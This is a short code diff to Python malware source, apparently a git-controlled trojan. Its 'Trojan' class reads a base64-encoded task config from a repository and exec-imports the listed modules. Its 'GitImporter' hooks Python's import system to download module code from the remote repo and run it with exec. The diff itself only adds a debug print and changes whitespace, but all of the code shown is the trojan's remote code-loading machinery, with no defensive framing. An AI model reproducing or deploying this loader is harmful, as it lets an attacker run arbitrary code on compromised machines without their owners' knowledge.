@@ -29,9 +29,10 @@ class Trojan:
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
-
+        
         for task in config:
             if task['module'] not in sys.modules:
+                print("import %s" % task['module'])
                 exec("import %s" % task['module'])
         return config
     
@@ -70,7 +71,7 @@ class GitImporter:
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
             return self
-        
+
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None,
                                                origin=self.repo.git_url)
@@ -78,7 +79,6 @@ class GitImporter:
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
         return new_module
-
 
 if __name__=='__main__':
     sys.meta_path.append(GitImporter())
